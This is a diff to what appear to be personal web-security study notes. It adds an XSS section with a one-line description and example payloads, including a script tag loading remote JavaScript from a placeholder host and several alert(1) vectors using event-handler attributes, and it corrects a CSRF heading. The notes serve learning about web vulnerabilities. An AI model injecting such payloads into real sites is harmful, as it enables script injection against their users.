@@ -15,6 +15,23 @@ and of course `F12(Developer tools)` in Browser(very useful!)
 
 
 ## Common Vulnerbilities
+
 ### XSS(Cross Site Scripting)
+#### Description
+Injects malicious code to a web page
+#### Attacking Vectors
+##### Basic
+`<script src = www.example.com/xss.js></script>`
+ 
+ or
+ 
+ `<script>alert(1)</script>`
+##### Advanced Vector
+`<a id=x tabindex=1 onactivate=alert(1)></a>`
+
+`<body onafterprint=alert(1)>`
+
+
+
 ### SQL Injection
-### CSRF (Cross-Site-Forgery)
+### CSRF (Cross-Site-Request-Forgery)
